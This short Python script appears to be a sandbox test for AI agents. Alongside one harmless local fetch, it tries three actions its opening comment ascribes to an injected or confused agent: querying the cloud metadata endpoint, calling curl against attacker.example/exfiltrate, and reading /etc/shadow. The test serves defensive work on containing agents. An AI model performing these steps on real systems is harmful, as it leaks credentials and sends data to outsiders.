# Same useful work, plus three things an injected or confused agent might do.
import json
import subprocess
import urllib.request

with urllib.request.urlopen("http://127.0.0.1:8080/data", timeout=3) as r:
    print(json.load(r)["items"][:5])

try:
    urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=1)
except Exception as e:
    print("metadata:", e)

try:
    subprocess.run(["curl", "-s", "-m", "2", "https://attacker.example/exfiltrate"], check=False)
except Exception as e:
    print("curl:", e)

try:
    open("/etc/shadow").read()
except Exception as e:
    print("shadow:", e)
